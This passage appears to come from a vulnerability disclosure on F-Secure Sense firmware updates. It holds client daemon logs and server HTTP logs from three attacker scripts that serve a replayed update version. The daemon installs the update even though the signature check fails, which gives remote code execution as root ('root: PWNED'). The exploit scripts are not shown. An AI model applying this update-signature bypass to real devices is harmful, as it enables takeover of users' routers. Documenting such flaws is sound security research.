fsupdate_daemon[3664]: fsguts2.c:2473[13] size 17301508
fsupdate_daemon[3664]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[3664]: fsguts2.c:2525[13] sha256 afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb
fsupdate_daemon[3664]: fsguts2.c:2447[13] file #2
fsupdate_daemon[3664]: fsguts2.c:2456[13] filename sense-firmware.ini
fsupdate_daemon[3664]: fsguts2.c:2473[13] size 239
fsupdate_daemon[3664]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[3664]: fsguts2.c:2525[13] sha256 047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9
fsupdate_daemon[3664]: fsguts2.c:2447[13] file #3
fsupdate_daemon[3664]: fsguts2.c:2456[13] filename fsupgrade
fsupdate_daemon[3664]: fsguts2.c:2473[13] size 1825
fsupdate_daemon[3664]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[3664]: fsguts2.c:2525[13] sha256 a46e6817b25fcd339b43db2b306a6ec9a5613afa9827288217de7346f3ca4e22
fsupdate_daemon[3664]: adt/fsjson.c:1545[13] trying to access array beyond the end at index 3, looking for index 4
fsupdate_daemon[3664]: fsguts2.c:2437[13] end of files in the header
fsupdate_daemon[3664]: download: daas2 check: /data/guts2/sense-firmware/1554196376
fsupdate_daemon[3956]: download: <<< version 1554196375 ready for install | pending+
fsupdate_daemon[3956]: install: >>> check for pending sense-firmware
fsupdate_daemon[3956]: install: pending update: /data/guts2/sense-firmware/1554196376
root: Firmware update executable starting
root: Schedule check: setup_completed=1 uptime=2246 skip_count=0 slot=4 hour=17
root: Out of upgrade slot 4, skipping firmware update
fsupdate_daemon[3956]: install: <<< firmware upgrade delayed with status 28416 exitcode 111 | pending+
fsupdate_daemon[3956]: run: next check in 55 minutes
```
**... (here I run fw_upgrade2.py on the server side)**

**... (the daemon will download and fail during the verify phase, then it will try to  install the pending update and delay more)**
```
fsupdate_daemon[4481]: fsguts2.c:2401[13] type sense-firmware
fsupdate_daemon[4481]: fsguts2.c:2408[13] version 1554196377
fsupdate_daemon[4481]: fsguts2.c:2414[13] title F-Secure Sense Firmware Update 2019-07-02_01
fsupdate_daemon[4481]: fsguts2.c:2421[13] cookie 96c7329d
fsupdate_daemon[4481]: adt/fshash.c:965[13] replacing the main hash array with the bigger one
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #0
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename sense-firmware.mf
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 10062
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #1
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename openwrt-rtkmips-rtl8198c-AP-fw.bin
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 17301508
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #2
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename sense-firmware.ini
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 239
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #3
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename fsupgrade
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 1844
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 59cbc90c560ceeda6292a0a8b64377144566a77e25d02cdeb9b33e511ddeebc9
fsupdate_daemon[4481]: adt/fsjson.c:1545[13] trying to access array beyond the end at index 3, looking for index 4
fsupdate_daemon[4481]: fsguts2.c:2437[13] end of files in the header
fsupdate_daemon[4481]: download: daas2 check: /data/guts2/sense-firmware/1554196377
fsupdate_daemon[4481]: check: VerifyManifest failed as 22
fsupdate_daemon[4481]: download: <<< ignore incorrectly signed update
fsupdate_daemon[4481]: install: >>> check for pending sense-firmware
fsupdate_daemon[4481]: install: pending update: /data/guts2/sense-firmware/1554196376
root: Firmware update executable starting
root: Schedule check: setup_completed=1 uptime=6364 skip_count=3 slot=4 hour=18
root: Out of upgrade slot 4, skipping firmware update
fsupdate_daemon[4481]: install: <<< firmware upgrade delayed with status 28416 exitcode 111 | pending+
fsupdate_daemon[4481]: run: next check in 55 minutes
```
**... (here I run fw_upgrade3.py on the server side)**

**... (now the daemon is tricked into re-downloading a firmware update with the same version as the initial good one and it overwrites the original files)**
```
fsupdate_daemon[4481]: fsguts2.c:3673[13] data 0x609b00, size 4096, stream 0x60d2d0
fsupdate_daemon[4481]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[4481]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[4481]: fsbzip2.c:461[13] count 0
fsupdate_daemon[4481]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[4481]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 4078119
fsupdate_daemon[4481]: fsguts2.c:3673[13] data 0x609b00, size 4096, stream 0x60d2d0
fsupdate_daemon[4481]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[4481]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[4481]: fsbzip2.c:461[13] count 0
fsupdate_daemon[4481]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[4481]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 4074023
fsupdate_daemon[4481]: fsguts2.c:3673[13] data 0x609b00, size 4096, stream 0x60d2d0
fsupdate_daemon[4481]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[4481]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[4481]: fsbzip2.c:461[13] count 0
fsupdate_daemon[4481]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[4481]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 4069927
fsupdate_daemon[4481]: fsguts2.c:3673[13] data 0x609b00, size 4096, stream 0x60d2d0
fsupdate_daemon[4481]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 0
fsupdate_daemon[4481]: fsbzip2.c:449[13] 4096 compressed bytes consumed, 0 left
fsupdate_daemon[4481]: fsbzip2.c:461[13] count 0
fsupdate_daemon[4481]: fsguts2.c:4149[13] count 4096, bz2left 0
fsupdate_daemon[4481]: fsguts2.c:4155[13] bz2left 0, datalen 4096, result 4096, i64 4096, streamleft 4065831

...

fsupdate_daemon[4481]: fsbzip2.c:453[13] BZ_STREAM_END
fsupdate_daemon[4481]: fsbzip2.c:461[13] count 56948
fsupdate_daemon[4481]: fsguts2.c:4149[13] count 2599, bz2left 0
fsupdate_daemon[4481]: fsguts2.c:4155[13] bz2left 0, datalen 2599, result 2599, i64 2599, streamleft 2599
fsupdate_daemon[4481]: fsguts2.c:4162[13] end of stream reached
fsupdate_daemon[4481]: fsguts2.c:4913[13] verified files set to 3
fsupdate_daemon[4481]: fsguts2.c:3803[13] header complete
fsupdate_daemon[4481]: fsguts2.c:4397[13] magic 'GUTS2AR1' ok
fsupdate_daemon[4481]: fsguts2.c:4426[13] stream encoding is bzip2
fsupdate_daemon[4481]: fsguts2.c:4431[13] file name length 64
fsupdate_daemon[4481]: fsguts2.c:3867[13] filename '047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9' read complete
fsupdate_daemon[4481]: fsguts2.c:2605[13] a matching hash '047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9' found
fsupdate_daemon[4481]: fsguts2.c:3995[13] output file path '/data/guts2/sense-firmware/1554196376/sense-firmware.ini'
fsupdate_daemon[4481]: fsbzip2.c:442[13] BZ2_bzDecompress() returned 4
fsupdate_daemon[4481]: fsbzip2.c:449[13] 182 compressed bytes consumed, 0 left
fsupdate_daemon[4481]: fsbzip2.c:453[13] BZ_STREAM_END
fsupdate_daemon[4481]: fsbzip2.c:461[13] count 239
fsupdate_daemon[4481]: fsguts2.c:4149[13] count 182, bz2left 0
fsupdate_daemon[4481]: fsguts2.c:4155[13] bz2left 0, datalen 182, result 182, i64 182, streamleft 182
fsupdate_daemon[4481]: fsguts2.c:4162[13] end of stream reached
fsupdate_daemon[4481]: fsguts2.c:4913[13] verified files set to 4
fsupdate_daemon[4481]: fsguts2.c:4621[13] fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612: sense-firmware.mf (10062, 1)
fsupdate_daemon[4481]: fsguts2.c:4621[13] afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb: openwrt-rtkmips-rtl8198c-AP-fw.bin (17301508, 1)
fsupdate_daemon[4481]: fsguts2.c:4621[13] 047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9: sense-firmware.ini (239, 1)
fsupdate_daemon[4481]: fsguts2.c:4621[13] 59cbc90c560ceeda6292a0a8b64377144566a77e25d02cdeb9b33e511ddeebc9: fsupgrade (1844, 1)
fsupdate_daemon[4481]: operator(): 100% downloaded
fsupdate_daemon[4481]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[4481]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[4481]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[4481]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[4481]: adt/fshash.c:135[13] create an initial hash array of size 5
fsupdate_daemon[4481]: adt/fshash.c:328[13] start growing hashtable to 21 slots
fsupdate_daemon[4481]: fsguts2.c:2401[13] type sense-firmware
fsupdate_daemon[4481]: fsguts2.c:2408[13] version 1554196376
fsupdate_daemon[4481]: fsguts2.c:2414[13] title F-Secure Sense Firmware Update 2019-07-02_01
fsupdate_daemon[4481]: fsguts2.c:2421[13] cookie 96c7329d
fsupdate_daemon[4481]: adt/fshash.c:965[13] replacing the main hash array with the bigger one
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #0
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename sense-firmware.mf
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 10062
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 fe538892b4db5efaa01a65ce88854442c7cf9d8695b571b1b522f22182169612
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #1
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename openwrt-rtkmips-rtl8198c-AP-fw.bin
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 17301508
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 afd39c13d05b41904ac28ccd17a940ccc69d072dffa94c7baaf1aa3e8ad7aacb
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #2
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename sense-firmware.ini
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 239
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 047eb19ca399fe94254667734ef3489b319158237410d425d78a0735a875f9d9
fsupdate_daemon[4481]: fsguts2.c:2447[13] file #3
fsupdate_daemon[4481]: fsguts2.c:2456[13] filename fsupgrade
fsupdate_daemon[4481]: fsguts2.c:2473[13] size 1844
fsupdate_daemon[4481]: adt/fsjson.c:1567[13] did not find node named 'path' under an object
fsupdate_daemon[4481]: fsguts2.c:2525[13] sha256 59cbc90c560ceeda6292a0a8b64377144566a77e25d02cdeb9b33e511ddeebc9
fsupdate_daemon[4481]: adt/fsjson.c:1545[13] trying to access array beyond the end at index 3, looking for index 4
fsupdate_daemon[4481]: fsguts2.c:2437[13] end of files in the header
fsupdate_daemon[4481]: download: daas2 check: /data/guts2/sense-firmware/1554196376
fsupdate_daemon[4481]: check: VerifyManifest failed as 22
fsupdate_daemon[4481]: download: <<< ignore incorrectly signed update
fsupdate_daemon[4481]: install: >>> check for pending sense-firmware
fsupdate_daemon[4481]: install: pending update: /data/guts2/sense-firmware/1554196376
root: PWNED
root: Firmware update executable starting
root: Schedule check: setup_completed=1 uptime=9750 skip_count=4 slot=4 hour=19
root: Out of upgrade slot 4, skipping firmware update
fsupdate_daemon[4481]: install: <<< firmware upgrade delayed with status 28416 exitcode 111 | pending+
fsupdate_daemon[4481]: run: next check in 55 minutes
```
### [END CLIENT LOG]

The message "**root: PWNED**" in the log indicates that the exploit succeeded.

Moreover, note these lines in the log:
```
fsupdate_daemon[4481]: download: daas2 check: /data/guts2/sense-firmware/1554196376
fsupdate_daemon[4481]: check: VerifyManifest failed as 22
fsupdate_daemon[4481]: download: <<< ignore incorrectly signed update
fsupdate_daemon[4481]: install: >>> check for pending sense-firmware
fsupdate_daemon[4481]: install: pending update: /data/guts2/sense-firmware/1554196376
```

The firmware version (and the entire firmware path btw) on which the check fails is then installed (executed) anyway, that's what allowed the RCE!


### [SERVER LOG]

On the server side (**fw_upgrade.py**):
```
192.168.71.1 - - [15/Aug/2019 15:24:44] "POST /q HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 15:24:44] "GET /h;t=sense-firmware;v=1554196376;c=96c7329d HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 15:24:45] "GET /o;t=sense-firmware;v=1554196376;c=96c7329d HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 15:24:45] "GET /f/17aa3e173e5e90b950741390f1d2286fe1028b66710eac1fcfcee93be7851e59_archive HTTP/1.0" 200 -
```
(**fw_upgrade2.py**):
```
192.168.71.1 - - [15/Aug/2019 16:39:27] "POST /q HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 16:39:28] "GET /h;t=sense-firmware;v=1554196377;c=96c7329d HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 16:39:28] "GET /o;t=sense-firmware;v=1554196377;c=96c7329d;pv=1554196376;pc=96c7329d HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 16:39:28] "GET /f/bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive HTTP/1.0" 200 -
```
(**fw_upgrade3.py**):
```
192.168.71.1 - - [15/Aug/2019 17:35:59] "POST /q HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 17:35:59] "GET /h;t=sense-firmware;v=1554196376;c=96c7329d HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 17:35:59] "GET /o;t=sense-firmware;v=1554196376;c=96c7329d;pv=1554196377;pc=96c7329d HTTP/1.0" 200 -
192.168.71.1 - - [15/Aug/2019 17:35:59] "GET /f/bd0feb5e499782182c6315d06d2803fcd1c24fcc88e9a02a2012050b0d4d0832_archive HTTP/1.0" 200 - <---- PWNED HERE
```
### [END SERVER LOG]
